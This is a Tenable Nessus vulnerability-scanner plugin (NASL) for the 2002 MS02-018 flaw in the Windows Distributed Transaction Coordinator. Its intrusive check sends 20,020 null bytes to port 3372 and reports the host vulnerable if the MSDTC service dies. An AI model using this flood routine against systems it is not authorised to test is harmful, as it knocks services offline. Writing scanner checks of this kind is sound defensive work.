#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(10939);
  script_version("1.34");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2002-0224");
  script_bugtraq_id(4006);
  script_xref(name:"MSFT", value:"MS02-018");
  script_xref(name:"MSKB", value:"319733");

  script_name(english:"MS02-018: Microsoft Windows Distributed Transaction Coordinator (DTC) Malformed Input DoS (319733) (intrusive check)");

  script_set_attribute(attribute:"synopsis", value:
"The remote service is prone to a denial of service attack.");
  script_set_attribute(attribute:"description", value:
"By sending a long series of malformed data (such as 20200 NULL bytes)
to the remote Windows MSDTC service, it is possible for an attacker to
cause the associated MSDTC.EXE to use 100% of the available CPU and
exhaust kernel resources.");
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/bugtraq/2002/Apr/290");
  script_set_attribute(attribute:"see_also", value:"https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2002/ms02-018");
  script_set_attribute(attribute:"solution", value:
"Microsoft has reportedly included the fix in MS02-018.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2002/01/31");
  script_set_attribute(attribute:"plugin_publication_date", value:"2002/04/20");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:microsoft:windows");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:microsoft:internet_information_server");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:microsoft:sql_server");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"Windows");

  script_copyright(english:"This script is Copyright (C) 2002-2022 Tenable Network Security, Inc.");

  script_dependencies("find_service1.nasl");
  script_require_ports("Services/msdtc", 3372);

  exit(0);
}

#
# Here we go
#

include("global_settings.inc");
include("misc_func.inc");

port = get_service(svc:"msdtc", default: 3372, exit_on_fail: 1);

soc = open_sock_tcp(port);
if(!soc)exit(1);
# 20020 = 20*1001
zer = raw_string(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);
send(socket:soc, data:zer) x 1001;
close(soc);
sleep(2);

if (service_is_dead(port: port) > 0)
  security_hole(port);
